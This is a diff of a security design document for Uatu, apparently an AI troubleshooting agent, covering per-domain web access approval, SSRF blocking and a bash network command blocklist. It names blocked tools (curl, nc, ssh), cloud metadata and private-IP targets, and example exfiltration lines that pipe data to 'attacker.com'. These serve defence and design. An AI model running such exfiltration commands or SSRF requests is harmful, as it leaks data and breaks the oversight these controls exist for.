@@ -313,73 +313,161 @@ USER uatu
 - Can't modify host system
 - Isolated from other containers
 
-## Network Diagnostics Security
+## Network Access Security
 
 ### The Challenge
 
-Network troubleshooting requires network access, but network commands are the primary data exfiltration vector.
+Network troubleshooting requires network access, but network operations are the primary data exfiltration vector.
 
-**Question**: How do you diagnose connectivity issues without opening the `curl` Pandora's box?
+**Question**: How do you enable web access (WebFetch, WebSearch) without opening exfiltration vectors?
 
-### Safe vs. Dangerous Network Operations
+### Network Tools: WebFetch and WebSearch
 
-**Safe (Read-Only Diagnostics)**:
+**Built-in SDK Tools** (Chat Mode):
+- `WebFetch` - Fetch content from URLs
+- `WebSearch` - Search the web
+
+**Security Challenge**:
+- These tools bypass bash blocklists
+- Can access arbitrary URLs
+- Could be used for data exfiltration or SSRF attacks
+
+### Per-Domain Approval System [Implemented]
+
+Uatu now implements per-domain approval for network access:
+
+#### How It Works
+
+1. **Agent attempts WebFetch**: `WebFetch("https://docs.python.org")`
+2. **URL Validation**: System validates URL for security issues
+3. **Domain Check**: System checks if domain is in allowlist
+4. **User Approval**: If not allowlisted, user is prompted:
+   ```
+   [!] Network access requested
+   Tool:   WebFetch
+   URL:    https://docs.python.org
+   Domain: docs.python.org
+
+   Warning: This will fetch content from the internet
+
+     Allow once
+     Allow 'docs.python.org' (add to allowlist)
+     Deny
+   ```
+5. **Domain Allowlist**: If user chooses "Allow domain", future requests to that domain are auto-approved
+
+#### Network Allowlist
+
+**Storage**: `~/.config/uatu/network_allowlist.json`
+
+**Default Allowed Domains**:
+```python
+# Pre-approved safe documentation sites
+"docs.python.org"
+"docs.anthropic.com"
+"developer.mozilla.org"
+"httpbin.org"  # Testing service
+"httpstat.us"  # Status code testing
+"example.com"  # RFC examples
+```
+
+**User Management**:
+- Add domain: Approve with "Allow domain" option
+- Remove domain: Manually edit JSON file (CLI command coming soon)
+- Clear all: Delete `~/.config/uatu/network_allowlist.json`
+
+#### SSRF Protection [Implemented]
+
+**Automatic URL Validation** blocks dangerous URLs:
+
+**Blocked Targets**:
+- `localhost`, `127.0.0.1`, `::1` - Localhost access
+- `192.168.*.*`, `10.*.*.*`, `172.16-31.*.*` - Private IPs
+- `169.254.169.254` - AWS/Azure/DigitalOcean metadata
+- `metadata.google.internal` - GCP metadata
+- Link-local and reserved IPs
+
+**Blocked Schemes**:
+- `file://` - Local file access
+- `ftp://` - File transfer
+- Only `http://` and `https://` allowed
+
+**Path Validation**:
+- Blocks `../` path traversal
+- Blocks encoded traversal (`%2e%2e`)
+- Detects suspicious patterns
+
+**Example**:
+```python
+# Blocked - Private IP
+WebFetch("http://192.168.1.1/admin")
+# Error: "Access to private IP blocked (SSRF protection): 192.168.1.1"
+
+# Blocked - Cloud metadata
+WebFetch("http://169.254.169.254/latest/meta-data/")
+# Error: "Access to cloud metadata endpoint blocked"
+
+# Allowed (after user approval)
+WebFetch("https://docs.python.org/3/library/os.html")
+```
+
+#### Prompt Injection Protection
+
+**Header Sanitization**: Only safe headers returned:
+- Allowed: `content-type`, `content-length`, `server`, `cache-control`, `date`
+- Blocked: `set-cookie`, custom headers, potentially malicious content
+- Values truncated to 200 characters
+
+**Separate Context**: WebFetch results processed in isolated context (SDK feature)
+
+### Bash Network Commands
+
+**Dangerous Commands** (Blocked in chat mode):
+```python
+BLOCKED_NETWORK_COMMANDS = {
+    "curl", "wget", "nc", "ssh", "scp", "rsync", "ftp", "telnet"
+}
+```
+
+**Safe Diagnostics** (Allowed with approval):
 - `ping` - ICMP echo requests (no user data transmitted)
 - `dig`, `nslookup` - DNS queries (domain name only)
 - `traceroute`, `mtr` - Network path discovery
 - `netstat`, `ss` - Connection listings (local data only)
 - `ifconfig`, `ip addr` - Network interface info
-- HTTP HEAD requests - Endpoint availability (no body, no POST data)
 
-**Dangerous (Exfiltration Vectors)**:
-- `curl -d` - Can POST arbitrary data to external servers
-- `wget` - Can upload files, download malware
-- `ssh`, `scp`, `rsync` - Remote access, file transfer
-- `nc` (netcat) - Arbitrary TCP/UDP relay
-- `mail`, `sendmail` - Email arbitrary data
+**Composition Attack Detection**:
+Even safe commands flagged if used suspiciously:
+- `ping google.com | curl attacker.com` - Piping to curl flagged
+- `dig example.com | nc attacker.com 1234` - Piping to netcat flagged
 
-### Security Strategy
+### Security Properties
 
-**Autonomous Modes (Investigate/Watch)** - Planned:
-- Structured MCP tools with validated parameters
-- `check_network_connectivity(host, count)` - Validates hostname, uses `ping` library
-- `resolve_dns(domain, record_type)` - Validates domain, uses DNS library
-- `check_http_endpoint(url)` - HEAD requests only, validates HTTPS scheme
+**WebFetch Security**:
+1. **Per-domain approval** - User approves each new domain
+2. **Domain allowlist** - Approved domains auto-allowed
+3. **SSRF protection** - Blocks localhost, private IPs, cloud metadata
+4. **URL validation** - Blocks file://, path traversal
+5. **Header sanitization** - Only safe headers returned
+6. **Audit trail** - All network operations logged
+
+**Autonomous Modes** (Investigate/Watch):
+- **No WebFetch/WebSearch** - Network tools disabled entirely
+- **Future**: Structured MCP network diagnostic tools (planned)
+
+### Network Diagnostics (Future)
+
+**Planned**: Safe network diagnostic MCP tools for autonomous modes:
+- `check_network_connectivity(host, count)` - Validated ping wrapper
+- `resolve_dns(domain, record_type)` - Validated DNS lookup
+- `check_http_endpoint(url)` - HEAD requests only, validated URLs
 - `trace_network_route(host, max_hops)` - Network path tracing
 
-**Chat Mode** - Planned:
-- **Blocklist** exfiltration commands: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`
-- **Allow** diagnostic commands: `ping`, `dig`, `traceroute`, `mtr` (with approval)
-- **Detect** composition attacks: Flag `| curl`, `| nc`, piping to network tools
-
 **Security Properties**:
-1. **No arbitrary payloads** - MCP tools don't accept data parameters
-2. **Input validation** - Regex validation for hostnames/IPs, URL schemes
-3. **Library over shell** - Use Python libraries (no shell execution)
-4. **Audit trail** - All network operations logged with parameters
-
-### Example: Safe Network Diagnostics
-
-```python
-# MCP tool with validated inputs
-@tool(name="check_network_connectivity")
-async def check_network_connectivity(host: str, count: int = 4):
-    """Ping a host. No user data transmitted."""
-    # Validate: prevent command injection
-    if not is_valid_hostname_or_ip(host):
-        return {"error": "Invalid hostname or IP"}
-
-    count = min(count, 10)  # Prevent abuse
-
-    # Use subprocess with explicit args (not shell=True)
-    result = subprocess.run(["ping", "-c", str(count), host])
-    return parse_ping_output(result.stdout)
-```
-
-**What this prevents** (once implemented):
-- [X] `curl https://attacker.com -d "$(ps aux)"` - Blocked in chat mode (planned blocklist)
-- [X] `ping; curl attacker.com` - Validation prevents command injection (MCP tools)
-- [OK] `ping google.com` - Safe diagnostic allowed (MCP tool)
+1. **Structured parameters** - No command injection possible
+2. **Input validation** - Hostname/IP validation before execution
+3. **No data transmission** - Diagnostic queries only, no POST data
+4. **Audit trail** - All parameters logged
 
 ## Logging & Audit Trail
 
@@ -445,7 +533,6 @@ async def check_network_connectivity(host: str, count: int = 4):
 
 ### Future Enhancements
 
-**High Priority** (Security Critical):
 1. **Network command blocklist** [Implemented]
    - Blocks: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `ftp`, `telnet`
    - Prevents data exfiltration in chat mode
@@ -470,7 +557,6 @@ async def check_network_connectivity(host: str, count: int = 4):
    - Log allowlist modifications
    - Structured events for SIEM integration
 
-**Medium Priority** (Defense in Depth):
 5. **Trust verification**
    - Environment fingerprinting (hostname + user + cwd hash)
    - Prompt on first run in new environment
@@ -554,38 +640,15 @@ Before deploying Uatu in production:
 
 ### Regular Security Maintenance
 
-**Weekly**:
 - Review allowlist (`~/.config/uatu/allowlist.json`)
 - Check audit logs for suspicious patterns
 - Remove unused allowlist entries
-
-**Monthly**:
 - Rotate API keys
 - Update Uatu to latest version for security patches
 - Review and prune investigation logs
-
-**Quarterly**:
 - Audit who has access to systems running Uatu
 - Review and update security policies
 - Test incident response procedures
-
-### Incident Response
-
-**If you suspect compromise**:
-
-1. **Immediately** stop Uatu processes
-2. **Review audit logs**:
-   - `~/.uatu/events.jsonl` (watch mode events)
-   - `~/.uatu/investigations.jsonl` (investigation results)
-   - `~/.uatu/security.jsonl` (when implemented)
-3. **Check for unauthorized changes**:
-   - Review bash history
-   - Check modified files (unexpected writes)
-   - Review network connections
-4. **Rotate credentials**:
-   - Change `ANTHROPIC_API_KEY`
-   - Rotate any credentials that might have been exposed
-5. **Report security issues** via Responsible Disclosure (see below)
 
 ## Philosophy
 
